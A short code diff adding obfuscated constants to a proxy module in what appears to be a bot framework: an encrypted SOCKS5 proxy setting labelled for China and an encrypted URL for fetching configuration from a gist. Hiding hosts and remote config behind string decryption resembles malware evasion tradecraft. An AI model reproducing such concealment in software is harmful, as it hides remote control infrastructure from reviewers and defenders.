@@ -21,6 +21,10 @@ class ProxyModule(BaseModule):
         {"host": decrypt_string("Al0bCiI5NhEuWRhNHA=="), "user": "nokey", "port_pattern": decrypt_string("Rm4cEHp9bB9z")},
     ]
 
+    # H-12b: Enhanced Proxy options for China
+    _CHINA_PROXY = decrypt_string("MkpIXxk6LA==") # socks5
+    _GIST_CONFIG_URL = decrypt_string("BkYMG3R+dgYmFBIdHhcIUhZWAwwmMTlCHwUYVwhL") 
+
     def __init__(self, bot=None, report_manager=None, temp_dir=None):
         super().__init__(bot, report_manager, temp_dir)
         self.proxy_active = False
